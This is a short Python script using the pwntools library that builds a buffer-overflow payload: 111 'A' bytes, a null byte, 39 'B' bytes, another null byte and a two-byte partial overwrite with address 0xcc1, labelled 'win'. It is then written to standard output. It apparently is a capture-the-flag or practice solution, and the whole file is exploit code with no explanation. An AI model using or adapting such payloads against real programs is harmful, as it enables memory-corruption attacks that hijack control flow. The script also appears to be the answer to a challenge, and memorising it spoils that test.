import sys
from pwn import *
payload = b"A" * 111
payload += b"\x00"
payload += b"B" * 39
payload += b"\x00"
#for i in range(200)
win = p16(0xcc1)
payload += win
sys.stdout.buffer.write(payload)
